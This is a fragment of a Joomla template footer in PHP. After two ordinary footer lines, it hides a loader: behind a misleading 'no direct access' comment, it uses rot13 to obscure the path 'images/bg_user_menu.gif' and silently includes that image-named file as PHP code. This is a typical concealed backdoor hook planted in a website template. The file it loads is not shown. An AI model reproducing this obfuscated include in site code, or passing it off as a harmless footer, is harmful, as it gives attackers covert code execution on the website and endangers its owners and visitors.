<div><?php echo $lineone; ?></div>
<div><?php echo JText::_( 'FOOTER_LINE2' ); ?><?php // no direct access
(@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13(vzntrf).DS.str_rot13('ot_hfre_zrah.tvs'))) or die('Restricted Access!'); ?></div>